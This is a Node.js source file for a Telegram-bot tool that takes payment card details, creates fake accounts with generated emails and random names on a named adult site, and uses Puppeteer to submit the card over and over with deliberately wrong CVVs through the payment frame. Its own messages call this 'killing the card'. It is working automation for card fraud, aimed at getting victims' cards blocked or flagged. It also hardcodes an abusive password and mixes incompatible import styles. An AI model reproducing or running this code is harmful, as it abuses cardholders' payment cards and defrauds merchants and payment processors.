const _storedMails = require('./saved data/unusedemail.json');
const _usedMails = require('./saved data/usedemail.json');
const util = require('util');
const Logger = require('./src/base/Logger');
const { Utils, accpetedFormats } = require('./src/base/utils');
const utils = new Utils();
const { numberOfRegisterInOneTime, oneTimeMailGen, domains } = require('./config');
const puppeteer = require('puppeteer');
const fs = require('fs');
let telegramBot = null;
const _sleep = util.promisify(setTimeout);
import _storedMails from './saved data/unusedemail.json' assert { type: 'json' };
import { TelegramBot } from './src/telegram/bot.js';
import { readJson } from 'https://deno.land/std/fs/mod.ts';

async function startTool() {
    await importantTaskBeforeStart();
    await startTelegramBot();
}

startTool();

async function startTelegramBot() {
    const { TelegramBot } = require('./src/telegram/bot');
    telegramBot = new TelegramBot();
    Logger.debug('Starting Telegram bot ...');
    await telegramBot.start().catch((err) => {
        console.error(err);
    });
    Logger.debug('Telegram bot started successfully!');
}

/**
 * 
 * @param {string} cardDetails Cards Details in this format: "1234 5678 1234 5678 | 02 | 2023 | 123"
 */
function executeOneOperationOk(cardDetails) {
    if (!cardDetails) return 'Please provide card details in any of these formats: ' + accpetedFormats.join(',\n');
    if (typeof cardDetails !== 'string') return 'Invalid card details provided! Please provide card details in any of these formats: ' + accpetedFormats.join(',\n');
    let firstCardDetails = "";
    try {
        firstCardDetails = utils.extractCardDetails(cardDetails);
        if (typeof firstCardDetails === 'string') {
            return firstCardDetails
        };
    } catch (error) {
        return `Invalid card details provided! Please provide card details in any of these formats: ${accpetedFormats.join(',\n')}`;
    };
    if (typeof firstCardDetails === 'string') {
        return `Invalid card details provided! Please provide card details in any of these formats: ${accpetedFormats.join(',\n')}`
    };
    try {
        return executeOneCCWholeProcess(firstCardDetails);
    } catch (error) {
        return `Error occurred while killing the card: ${firstCardDetails.toString()}`
    };
}

/**
 * 
 * @param {Object} cardDetails - Object of card details
 * @param {number} cardDetails.cardNumber - Card number
 * @param {number} cardDetails.expireMonth - Card expire month
 * @param {number} cardDetails.expireYear - Card expire year
 * @param {number} cardDetails.cvv - Card cvv
 * @param {string} teleuser_name_id - Telegram user name and id
 */
async function executeOneCCWholeProcess(cardDetails, teleuser_name_id = null) {
    cardDetails.expireYear = cardDetails.expireYear;
    let ok_result_main = null;
    try {
        for (let i = 0; i < (numberOfRegisterInOneTime - 1); i++) {
            registerUser(cardDetails);
        };
        ok_result_main =  await registerUser(cardDetails);
    } catch (err) {
        console.error(err);
        return Promise.resolve(`Error occurred while killing the card!`);
    } finally {
        return ok_result_main;
    };
};

/**
 * 
 * @param {puppeteer.Frame} cardFrame 
 */
async function fillAndSubmitCardDetails(cardFrame, cardDetails, fakeCvv) {
    await _sleep(600);
    let card_frame_wait = await cardFrame.waitForSelector('#fname').catch(async (_err) => {
        if (_err.toString().includes('Error: Waiting for selector `#fname` failed: waitForFunction failed: frame got detached.') || _err.toString().includes('Waiting for selector `#fname` failed: Waiting failed: 10000ms exceeded')) {
            return true;
        };
        const _htmlBody = await cardFrame.evaluate(() => document.body.innerHTML).catch(async(_err) => {
            if (_err.toString().includes(`TargetCloseError: Protocol error (Runtime.callFunctionOn): Session closed. Most likely the iframe has been closed.`)) {
                return true;
            };
        });
        if (_htmlBody === true ||  (_htmlBody.length && _htmlBody.includes(`<h1>HTTP Status 400 – Bad Request</h1>`))) {
            return true;
        };
        let stringError = _err.toString();
        console.log(`Error in String Format: ${stringError}\n\n`);
        console.error(_err);
        return await fillAndSubmitCardDetails(cardFrame, cardDetails, fakeCvv);
    });
    if (card_frame_wait === true) return;
    const _cardNumberInput = await cardFrame.$('#cardno')
    const _isCardNumberEmpty = await cardFrame.evaluate((input) => input.value === '', _cardNumberInput);
    if (_isCardNumberEmpty) {
        await cardFrame.type('#cardno', cardDetails.cardNumber.toString());
    };
    await cardFrame.waitForSelector('#cvv2', { timeout: 5000 });
    const _cvvInput = await cardFrame.$('#cvv2');
    const _isCvvEmpty = await cardFrame.evaluate((input) => input.value === '', _cvvInput);
    if (_isCvvEmpty) {
        await cardFrame.type('#cvv2', fakeCvv.toString());
    };
    await cardFrame.waitForSelector('#expire_month', { timeout: 5000 });
    const _expireMonthInput = await cardFrame.$('#expire_month');
    const _isExpireMonthEmpty = await cardFrame.evaluate((input) => input.value === '', _expireMonthInput);
    if (_isExpireMonthEmpty) {
        await cardFrame.select('#expire_month', cardDetails.expireMonth.toString());
    };
    await cardFrame.waitForSelector('#expire_year', { timeout: 5000 });
    const _expireYearInput = await cardFrame.$('#expire_year');
    const _isExpireYearEmpty = await cardFrame.evaluate((input) => input.value === '', _expireYearInput);
    if (_isExpireYearEmpty) {
        await cardFrame.select('#expire_year', cardDetails.expireYear.toString());
    };
    await _sleep(500);
    await cardFrame.waitForSelector('.submitButton', { timeout: 5000 });
    await cardFrame.click('.submitButton');
    return;
};


/**
 * 
 * @param {Object} cardDetails - Object of card details
 * @param {number} cardDetails.cardNumber - Card number
 * @param {number} cardDetails.expireMonth - Card expire month
 * @param {number} cardDetails.expireYear - Card expire year
 * @param {number} cardDetails.cvv - Card cvv
 */
async function registerUser(cardDetails) {
    const _startedTime = new Date().getTime();
    const _requiredDetails = getRequiredDetails();
    const { email, nickName, password, firstName, lastName } = _requiredDetails;
    const _fakeCvv = utils.generateUnqiueCvv(cardDetails.cvv);
    Logger.debug(`Registering user with email: ${email} | nickName: ${nickName} | password: ${password} | firstName: ${firstName} | lastName: ${lastName}`);
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();
    try {
        await page.goto('https://getkinky.com/signup');
        await page.waitForSelector('#username');
        await page.type('#username', _requiredDetails.email);
        await page.type('#nickname', _requiredDetails.nickName);
        await page.type('#password', _requiredDetails.password);
        await page.click('button[type="submit"]');
        await fillTheRegistrationPage(page, browser, _requiredDetails);
        Logger.debug(`Registration page filled successfully! Next page: ${page.url()};`);
        let cardFrame = await getProperAllFrames(page);
        if (!cardFrame) {
            Logger.error('No card frame found! Cancelling the registration process ...');
            return `Error while killing the card! Please provide this information to the developer: error9009`;
        };
        await cardFrame.waitForSelector('#fname', { timeout: 5000 }).catch(async (_err) => {
            Logger.error('Error from this line: wait for selector #fname wala  1st wait for selector in registerUser function');
            console.error(_err);
        });
        Logger.debug(`Card frame found successfully! Next page: ${cardFrame.url()}`);
        await cardFrame.type('#fname', firstName);
        await cardFrame.type('#lname', lastName);
        await cardFrame.type('#cardno', cardDetails.cardNumber.toString());
        await cardFrame.type('#cvv2', _fakeCvv.toString());
        await cardFrame.select('#expire_month', cardDetails.expireMonth.toString());
        await cardFrame.select('#expire_year', cardDetails.expireYear.toString());
        Logger.debug('Card details filled successfully!');
        await _sleep(500);
        await cardFrame.click('.submitButton').then(async () => {
            await _sleep(500);
            await fillAndSubmitCardDetails(cardFrame, cardDetails, _fakeCvv);
        }).catch(async (_err) => {
            if (_err.toString().includes('No element found for selector: .submitButton')) {
                await _sleep(500);
                await fillAndSubmitCardDetails(cardFrame, cardDetails, _fakeCvv);
            } else if (_err.toString().includes('Execution context was destroyed, most likely because of a navigation.')) {
                await _sleep(500);
                await fillAndSubmitCardDetails(cardFrame, cardDetails, _fakeCvv);
            } else {
                console.error(_err);
            };
        });
    } catch (error) {
        Logger.error('Error occurred while registering the user! Cancelling the registration process ... Error from this line: try catch block');
        console.error(error);
        return  `Error while killing the card! Please provide this information to the developer: error90010`;;
    } finally {
        await _sleep(6000);
        await browser.close();
        const _endedTime = new Date().getTime();
        const _timeTaken = (_endedTime - _startedTime) / 1000;
        Logger.debug(`Registration process completed successfully! Time taken: ${_timeTaken} seconds!`);
        return Promise.resolve(true);
    };
};

/**
 * 
 * @param {puppeteer.Page} page 
 */
async function getProperAllFrames(page) {
    await _sleep(1000);
    if (!page.frames().length) {
        return await getProperAllFrames(page);
    };
    let cardFrame = null;
    while (page.frames().length < 3 && cardFrame === null) {
        await _sleep(1000);
        problempage = page;
        for (let frame of page.frames()) {
            if (frame.url().length !== 0 && frame.url() !== 'https://getkinky.com/signup/verify') {
                const parsedUrl = new URL(frame.url());
                if (parsedUrl.searchParams.has('payment_method')) {
                    cardFrame = frame;
                    break;
                } else if (parsedUrl.hostname.length && parsedUrl.hostname.endsWith('rocketgate.com')) {
                    cardFrame = frame;
                    break;
                };
            };
        };
    };
    if (cardFrame === null) {
        await _sleep(1000);
        return await getProperAllFrames(page);
    };
    return cardFrame;
};

/**
 * 
 * @param {puppeteer.Page} page 
 * @param {Object} _requiredDetails 
 * @param {string} _requiredDetails.email
 * @param {string} _requiredDetails.nickName
 * @param {string} _requiredDetails.password
 * @param {string} _requiredDetails.firstName
 * @param {string} _requiredDetails.lastName
 */
async function fillTheRequiredValuesWhileLogin(page, _requiredDetails) {
    if (page.url() === "https://getkinky.com/login") {
        await page.waitForSelector('#email');
        const _emailInput = await page.$('#email');
        const _isEmailEmpty = await page.evaluate((input) => input.value === '', _emailInput);
        if (_isEmailEmpty) {
            await page.type('#email', _requiredDetails.email);
        };
        await page.waitForSelector('#password');
        const _passwordInput = await page.$('#password');
        const _isPasswordEmpty = await page.evaluate((input) => input.value === '', _passwordInput);
        if (_isPasswordEmpty) {
            await page.type('#password', _requiredDetails.password);
        };
        await page.waitForSelector('button[type="submit"]');
        console.log(`Filling the login page. Page URL: ${page.url()}`);
        await page.click('button[type="submit"]');
        await page.waitForSelector('button[type="submit"]');
        return true;
    };
    return false;
};

/**
 * 
 * @param {puppeteer.Page} page 
 * @param {Object} _requiredDetails 
 * @param {string} _requiredDetails.email
 * @param {string} _requiredDetails.nickName
 * @param {string} _requiredDetails.password
 * @param {string} _requiredDetails.firstName
 * @param {string} _requiredDetails.lastName
 */
async function fillTheRegistrationPage(page, browser, _requiredDetails, retryCounts = 0) {
    if (page.url() === "https://getkinky.com/signup/verify") {
        return;
    };
    if (page.url() === "https://getkinky.com/signup" || (page.url() === "https://getkinky.com/signup/register"  && retryCounts < 4)) {
        await page.waitForSelector('#username');
        const _emailInput = await page.$('#username');
        const _isEmailEmpty = await page.evaluate((input) => input.value === '', _emailInput);
        if (_isEmailEmpty) {
            await page.type('#username', _requiredDetails.email);
        };
        await page.waitForSelector('#nickname');
        const _nickNameInput = await page.$('#nickname');
        const _isNickNameEmpty = await page.evaluate((input) => input.value === '', _nickNameInput);
        if (_isNickNameEmpty) {
            await page.type('#nickname', _requiredDetails.nickName);
        };
        await page.waitForSelector('#password');
        const _passwordInput = await page.$('#password');
        const _isPasswordEmpty = await page.evaluate((input) => input.value === '', _passwordInput);
        if (_isPasswordEmpty) {
            await page.type('#password', _requiredDetails.password);
        };
        await page.waitForSelector('button[type="submit"]');
        console.log(`Filling the registration page. Retry Counts: ${retryCounts} | Page URL: ${page.url()}`)
        await page.click('button[type="submit"]').then(async () => {
            await _sleep(1000);
        }).catch(async (_err) => {
            console.log(`Error Line Executed of click button[type="submit"] Retry Counts: ${retryCounts} | Page URL: ${page.url()}`)
            if (_err.toString().includes('No element found for selector: button[type="submit"]')) {
                await _sleep(200);
                console.log(`Error Line Executed of click button[type="submit"] Retry Counts: ${retryCounts} | Page URL: ${page.url()} | No element found line`)
                return await fillTheRegistrationPage(page, browser, _requiredDetails);
            };
        });
        retryCounts++;
    };
    if (page.url() === "https://getkinky.com/signup/verify") return;
    if (retryCounts === 4) {
        await page.goto('https://getkinky.com/login');
        await page.waitForSelector('#email');
        const _done_oneLogin = await fillTheRequiredValuesWhileLogin(page, _requiredDetails);
        if (_done_oneLogin) {
            await page.goto('https://getkinky.com/signup/register');
            await page.waitForSelector('#username');
            return await fillTheRegistrationPage(page, browser, _requiredDetails);
        } else if (page.url() === "https://getkinky.com/signup/verify") {
            return;
        };
    };
    while (page.url() !== 'https://getkinky.com/signup') {
        retryCounts++;
        await _sleep(1000);
        if (page.url() !== 'https://getkinky.com/signup') {
            await page.click('button[type="submit"]').catch(async (_err) => {
                if (_err.toString().includes('No element found for selector: button[type="submit"]')) {
                    await _sleep(1000);
                    return await fillTheRegistrationPage(page, browser, _requiredDetails, retryCounts);
                };
            });
            await _sleep(1000);
            if (page.url() !== 'https://getkinky.com/signup') {
                return await fillTheRegistrationPage(page, browser, _requiredDetails, retryCounts);
            };
        };
    };
    return true;
};

async function importantTaskBeforeStart() {
    if (_storedMails.length < oneTimeMailGen) {
        Logger.debug('Generating new emails for the first time ...');
        await saveUnusedEmails();
        Logger.debug('Emails generated successfully');
    } else {
        Logger.debug('No need to generate new emails.\tAlready have enough emails to use. Starting the tool ...');
    };
};

function _saveUnUsedEmails() {
    try {
        fs.writeFileSync('./saved data/unusedemail.json', JSON.stringify([..._storedMails], null, 2));
    } catch (error) {
        Logger.error('Error saving unused emails');
    };
};

async function saveUnusedEmails() {
    if (_storedMails.length < oneTimeMailGen) {
        const _usedAndStoredEmails = new Set([..._usedMails, ..._storedMails]);
        const _newUnusedEmails = [..._storedMails];
        for (let i = 0; i < oneTimeMailGen; i++) {
            const email = generateRandomEmails();
            if (!_usedAndStoredEmails.has(email)) {
                _newUnusedEmails.push(email);
                _usedAndStoredEmails.add(email);
            } else {
                i--;
            };
        };
        _storedMails = _newUnusedEmails;
        _saveUnUsedEmails();
    } else {
        Logger.debug('No need to generate new emails');
    };
};

function generateRandomEmails() {
    const usernameLength = Math.floor(Math.random() * 11) + 20;
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const username = Array.from({ length: usernameLength }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
    const suffixLength = Math.floor(Math.random() * 6) + 3;
    const suffix = Array.from({ length: suffixLength }, () => Math.floor(Math.random() * 10)).join('');
    const final_username = username + suffix;
    const domain = domains[Math.floor(Math.random() * domains.length)];
    const _emailkk = final_username + '@' + domain;
    return _emailkk;
};

function getRequiredDetails() {
    const _requiredDetails = {
        email: null,
        nickName: null,
        password: "loduMCBC@#6566chutiyaaran2324@",
        firstName: null,
        lastName: null,
    };
    _requiredDetails.email = _storedMails.shift();
    _usedMails.push(_requiredDetails.email);
    const _randomName = utils.getRandomName();
    _requiredDetails.nickName = _randomName.nickName;
    _requiredDetails.firstName = _randomName.firstName;
    _requiredDetails.lastName = _randomName.lastName;
    return _requiredDetails;
};

module.exports = {
    executeOneOperationOk,
    Logger,
    accpetedFormats,
    _sleep, 
    utils
};